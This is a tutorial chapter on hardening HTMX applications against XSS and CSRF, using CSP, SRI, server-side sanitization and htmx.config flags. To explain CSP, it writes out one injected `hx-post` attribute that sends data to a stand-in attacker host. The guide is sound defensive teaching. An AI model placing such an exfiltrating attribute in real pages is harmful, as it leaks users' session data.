# Chapter 6: Security, CSP & Content Protection

## Core Idea
Because HTMX applications exchange raw HTML fragments rather than sanitized JSON data strings, the attack surface for Cross-Site Scripting (XSS) shifts: server-side HTML escaping, strict Content Security Policies (CSP), Subresource Integrity (SRI), and HTMX runtime hardening flags are mandatory defense-in-depth measures.

## Frameworks Introduced
- **The Hypermedia XSS Attack Surface Model**:
  - In a JSON SPA architecture, client frameworks (React, Vue) typically assign values to `element.textContent`, which automatically neutralizes HTML tags.
  - In an HTMX hypermedia architecture, the server delivers raw markup swapped directly into `innerHTML` or `outerHTML`. If untrusted user input is concatenated into an HTML template without strict escaping, the injected payload executes immediately upon DOM insertion.
  - Invariant: *Every* user-submitted field must be escaped by default by the template engine, or sanitized with an allowlist parser if rich text is permitted.

- **HTMX Runtime Security Hardening Triad**:
  - Three configuration flags disable potentially dangerous browser execution vectors:
    1. `htmx.config.selfRequestsOnly = true`: Rejects any `hx-get`, `hx-post`, etc., targeting an external domain. Prevents attackers from injecting an attribute that leaks session data to an external server.
    2. `htmx.config.allowScriptTags = false`: Instructs HTMX to strip and ignore any `<script>` tags embedded in swapped HTML fragments.
    3. `htmx.config.allowEval = false`: Disables evaluation of JavaScript expressions in attributes, blocking script execution tricks.

- **CSRF Token Synchronization Architecture**:
  - Because HTMX issues state-modifying requests (`POST`, `PUT`, `PATCH`, `DELETE`) via `XMLHttpRequest`, browsers do not automatically attach hidden form CSRF tokens unless explicitly configured.
  - Standard Pattern: Inject the server's anti-CSRF token into outgoing headers via `htmx:configRequest` or container-level `hx-headers`.

## Key Concepts
- **XSS (Cross-Site Scripting)**: Injection vulnerability where malicious scripts are executed in victim browsers via untrusted HTML or attribute content.
- **HTML Escaping**: Converting dangerous characters (`&`, `<`, `>`, `"`, `'`) into harmless HTML entities (`&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#39;`).
- **HTML Sanitization**: Using an AST allowlist parser (e.g. DOMPurify, bleach, nh3) to scrub disallowed tags and event attributes (`onerror`, `onload`) from user-authored rich text.
- **CSP (Content Security Policy)**: HTTP response header restricting which scripts, styles, and network endpoints the browser is permitted to execute or contact.
- **SRI (Subresource Integrity)**: Cryptographic hash verification (`integrity="sha384-..."`) ensuring CDN-hosted scripts (including HTMX itself) have not been tampered with.
- **Cookie Security Flags**: `HttpOnly` (blocks JavaScript read access), `Secure` (restricts transmission to HTTPS), `SameSite=Lax/Strict` (mitigates CSRF).

## Mental Models
- **The Sanitized Pipe vs The Open Firehose**: JSON APIs are narrow copper pipes delivering raw water (data); the client filters and bottles it. HTMX is a firehose delivering pre-mixed soup (markup); if the server fails to strain out poisoned ingredients before delivery, the user consumes them immediately.
- **Defense in Depth**: Security never relies on one wall. (1) Escape in templates, (2) sanitize rich inputs, (3) harden `htmx.config`, (4) enforce strict CSP, and (5) secure session cookies.

## Anti-patterns
- **Using `|safe` or `raw()` on Untrusted User Variables**: Marking user-submitted comments, usernames, or titles as "safe" in template engines to avoid entity encoding, creating an instant stored XSS hole.
- **Trusting Client-Supplied Target Selectors**: Allowing user input to dynamically specify `hx-target` or `hx-swap`, enabling an attacker to overwrite sensitive parts of the DOM (e.g. auth forms or navigation headers).
    - **Wildcard Content Security Policies (`*`)**: Setting `connect-src *` or omitting CSP headers, allowing malicious injected tags to issue requests to third-party tracking or unauthorized external servers.
- **Skipping CSRF on Non-POST Verbs**: Configuring backend middleware to exempt `PUT`, `PATCH`, or `DELETE` requests from CSRF checks under the false assumption that only `POST` needs protection.

## Code Examples

### 1. HTMX Runtime Hardening Configuration
```html
<!-- Load HTMX with Subresource Integrity (SRI) -->
<script src="https://unpkg.com/htmx.org@1.9.10"
        integrity="sha384-D1Kt99CQMDuVetoL1lrYwg5t+9QdHe7NLX/SoJYkXDFfX37iInKRy5xLSi8nO7UC"
        crossorigin="anonymous">
</script>

<script>
  // Lock down HTMX security defaults immediately after loading
  htmx.config.selfRequestsOnly = true;     // Block requests to external domains
  htmx.config.allowScriptTags = false;     // Refuse to execute swapped <script> tags
  htmx.config.allowEval = false;           // Disable eval() expressions
</script>
```

### 2. Hardened Content Security Policy (CSP) Header
```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-rAnd0m12345' https://unpkg.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self';
  frame-ancestors 'none';
  form-action 'self';
```
- **Why `connect-src 'self'` matters**: HTMX issues all AJAX calls via `XMLHttpRequest`. If an attacker manages to inject `<button hx-post="https://evil.com/leak/">`, the browser blocks the connection because `evil.com` violates `connect-src 'self'`.

### 3. Server-Side Rich Text Sanitization (Python Example)
```python
# Server-side view cleaning rich-text user input before saving
import nh3

ALLOWED_TAGS = {"p", "b", "i", "strong", "em", "ul", "ol", "li", "a", "code", "pre"}
ALLOWED_ATTRIBUTES = {"a": {"href", "title"}}

def clean_comment_html(raw_user_html: str) -> str:
    # nh3 is an extremely fast, secure HTML sanitizer powered by Rust's ammonia
    return nh3.clean(
        raw_user_html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        link_rel="noopener noreferrer"
    )
```

### 4. Global CSRF Header Configuration via Body Attribute
```html
<!-- Attach CSRF token globally to all descendant HTMX requests -->
<body hx-headers='{"X-CSRFToken": "{{ csrf_token }}"}'>
  <!-- Every child hx-post/put/delete inherits this header automatically -->
  <button hx-post="/projects/1/archive/">Archive Project</button>
</body>
```

## Reference Tables

### Security Checklist for Hypermedia Apps
| Threat / Vector | Mitigation Technique | Enforcement Layer |
|:---|:---|:---|
| **Stored XSS** | Context-aware HTML auto-escaping | Template Engine (Jinja / Django DTL) |
| **Rich Text XSS** | Strict tag/attribute allowlist sanitization | Server Model / View Layer (`nh3` / `bleach`) |
| **Tampered Scripts** | Subresource Integrity (`integrity="sha384-..."`) | Base HTML `<script>` tags |
| **Cross-Site Forgery** | `SameSite=Strict`, `X-CSRFToken` header | Web Framework Middleware & `hx-headers` |
| **Unauthorized Data Leaks** | `htmx.config.selfRequestsOnly = true` + CSP `connect-src` | HTMX Config + HTTP Response Header |
| **Malicious Scripts in Swaps** | `htmx.config.allowScriptTags = false` | HTMX Runtime Configuration |
| **Session Hijacking** | `HttpOnly; Secure; SameSite=Lax` cookie flags | Server Session Cookie Configuration |

### Cookie Security Flags Matrix
| Flag | What It Does | Why It Is Mandatory in HTMX Apps |
|:---|:---|:---|
| `HttpOnly` | Prevents client JavaScript from reading `document.cookie` | If an XSS vulnerability occurs, session cookies cannot be stolen |
| `Secure` | Ensures cookie is only sent over encrypted HTTPS connections | Protects session tokens from packet sniffing on public networks |
| `SameSite=Lax` | Blocks cookies on cross-origin POST requests | Mitigates CSRF attacks from external phishing websites |
| `SameSite=Strict`| Blocks cookies on all cross-origin requests, including links | Highest security level for sensitive authenticated dashboards |

## Worked Example

### End-to-End Secure Comment Submission
A robust, secure comment submission component featuring CSRF protection, server-side sanitization, and XSS-hardened response handling:

**1. Form Markup (Base Template with CSRF and Hardened HTMX):**
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Secure Discussions</title>
  <script src="https://unpkg.com/htmx.org@1.9.10"
          integrity="sha384-D1Kt99CQMDuVetoL1lrYwg5t+9QdHe7NLX/SoJYkXDFfX37iInKRy5xLSi8nO7UC"
          crossorigin="anonymous"></script>
  <script>
    htmx.config.selfRequestsOnly = true;
    htmx.config.allowScriptTags = false;
  </script>
</head>
<body hx-headers='{"X-CSRFToken": "{{ csrf_token }}"}'>
  <main>
    <h2>Community Feedback</h2>
    
    <!-- Submission Form -->
    <form hx-post="/comments/new/"
          hx-target="#comment-stream"
          hx-swap="afterbegin"
          hx-on::after-request="if(event.detail.successful) this.reset()">
      <label for="comment-text">Share your thoughts:</label>
      <textarea id="comment-text" name="comment_body" required></textarea>
      <button type="submit" hx-disabled-elt="this">Post Comment</button>
    </form>

    <!-- Comments Container -->
    <div id="comment-stream">
      <!-- Existing safe server-rendered comments -->
    </div>
  </main>
</body>
</html>
```

**2. Server-Side Validation & Sanitization (Django View):**
```python
from django.shortcuts import render
from django.http import HttpResponseBadRequest
from django.utils.html import escape
import nh3

def add_comment(request):
    if request.method != "POST":
        return HttpResponseBadRequest("Invalid method")
    
    raw_text = request.POST.get("comment_body", "").strip()
    if not raw_text:
        return HttpResponseBadRequest("Comment cannot be empty")
    
    # 1. Sanitize text allowing only basic formatting (no scripts or events)
    safe_html = nh3.clean(raw_text, tags={"p", "b", "i", "strong", "em"})
    
    # 2. Persist safe version to database
    comment = Comment.objects.create(author=request.user, content=safe_html)
    
    # 3. Render snippet template with safe content
    return render(request, "comments/partial_comment.html", {"comment": comment})
```

**3. Swapped Partial Template (`partial_comment.html`):**
```html
<div class="comment-card" id="comment-{{ comment.id }}">
  <div class="comment-header">
    <!-- Username escaped automatically by Django template engine -->
    <strong>{{ comment.author.username }}</strong>
    <span class="timestamp">{{ comment.created_at|date:"M d, H:i" }}</span>
  </div>
  <div class="comment-body">
    <!-- Sanitized HTML rendered with mark_safe ONLY because it passed nh3.clean -->
    {{ comment.content|safe }}
  </div>
</div>
```

## Key Takeaways
1. Hypermedia swaps raw HTML directly into the DOM; unescaped user inputs create immediate XSS vulnerabilities.
2. Always keep auto-escaping enabled in your template engine; never use `|safe` on raw user inputs.
3. If users must submit rich text, sanitize it on the server using strict allowlist libraries (`nh3`, `DOMPurify`) before storage.
4. Harden the client runtime by setting `htmx.config.selfRequestsOnly = true` and `htmx.config.allowScriptTags = false`.
5. Enforce a strict Content Security Policy (`connect-src 'self'`) and always verify third-party CDN scripts with Subresource Integrity (SRI).

## Connects To
- **Ch 01**: HTMX Foundations & Attributes — the core request/response model.
- **Ch 05**: HTMX JavaScript API & Lifecycle — configuring `htmx.config` security options.
- **Ch 08**: Django HTMX Foundations — configuring Django's CSRF token protection with HTMX.
